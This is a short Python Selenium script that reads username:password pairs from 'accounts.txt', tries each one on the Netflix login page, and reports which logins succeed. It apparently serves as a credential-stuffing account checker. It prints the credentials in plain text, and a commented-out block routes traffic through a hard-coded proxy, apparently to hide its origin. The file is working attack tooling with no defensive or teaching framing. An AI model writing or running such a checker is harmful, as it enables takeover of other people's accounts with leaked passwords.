from selenium import webdriver
import getpass
import time

# proxy = "62.210.105.103:3128"

# firefox_capabilities = webdriver.DesiredCapabilities.FIREFOX
# firefox_capabilities['marionette'] = True

# firefox_capabilities['proxy'] = {
#     "proxyType": "MANUAL",
#     "httpProxy": proxy,
#     "ftpProxy": proxy,
#     "sslProxy": proxy
# }

def loginBOT(usr, pas):

    br = webdriver.Firefox()

    br.get("https://www.netflix.com/bd/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse") #https://www.netflix.com/bd/Login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse

    user = br.find_element_by_id("id_userLoginId")
    user.clear()
    user.send_keys(usr)

    passwd = br.find_element_by_id("id_password")
    passwd.clear()
    passwd.send_keys(pas)

    time.sleep(2)

    btn = br.find_element_by_css_selector("button.btn.login-button.btn-submit.btn-small")
    btn.click()
    
    

    if br.current_url == "https://www.netflix.com/browse":
        print ('Logged In')
        # br.open('https://www.netflix.com/bd/logout')
        # time.sleep(2)
    else:
        print ('Failed..')
        # time.sleep(2)
    br.quit()


if __name__ == "__main__":
    with open("accounts.txt") as f:
        for i, line in enumerate(f):
            line = line.strip()
            # print('line {:3d}: {}'.format(i, line))

            if len(line) > 0:
                # this will only run when the line is NOT empty

                # data, _ = line.split('|',1)
                usr, pwd = line.split(':')
                usr = usr.strip()
                pwd = pwd.strip()

                print('line {:3d} usr: {}'.format(i, usr))
                print('line {:3d} pwd: {}'.format(i, pwd))

                loginBOT(usr, pwd)

